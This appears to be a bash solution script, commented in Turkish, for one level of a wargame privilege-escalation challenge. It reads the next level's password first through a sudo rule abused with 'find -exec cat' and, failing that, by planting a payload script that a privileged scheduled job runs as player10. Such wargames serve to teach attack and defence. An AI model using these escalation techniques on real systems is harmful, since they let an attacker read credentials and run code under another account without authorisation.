#!/usr/bin/env bash
# İki profil, iki mekanizma, tek ders: dar görünen yetki geniştir.
set -Eeuo pipefail

# 1) Varsayılan profil: sudo kuralı + GTFOBins (find -exec).
#    sudo hedef kullanıcı ev dizinine giremez -> /tmp'den çalıştır.
seal="$(cd /tmp && sudo -n -u player10 /usr/bin/find /etc/wargame/pass/10 \
  -exec cat {} \; 2>/dev/null || true)"

# 2) Sertleştirilmiş profil: ayrıcalıklı iş, bizim betiğimizi player10
#    adına çalıştırıyor. Betiği yaz, sonraki dakika tikini bekle.
if [[ -z "$seal" ]]; then
  cat > /var/spool/wargame/09/sync.sh <<'PAYLOAD'
#!/bin/sh
cat /etc/wargame/pass/10 > /tmp/seal-10.out
chmod 0644 /tmp/seal-10.out
PAYLOAD
  chmod 0755 /var/spool/wargame/09/sync.sh

  for _ in $(seq 1 75); do
    [[ -s /tmp/seal-10.out ]] && break
    sleep 1
  done
  seal="$(cat /tmp/seal-10.out 2>/dev/null || true)"
  # Dosya player10'a ait ve /tmp sticky; silinemez — sorun değil.
  rm -f /tmp/seal-10.out 2>/dev/null || true
fi

[[ -n "$seal" ]] || { echo "mühür okunamadı" >&2; exit 1; }
printf '%s\n' "$seal"
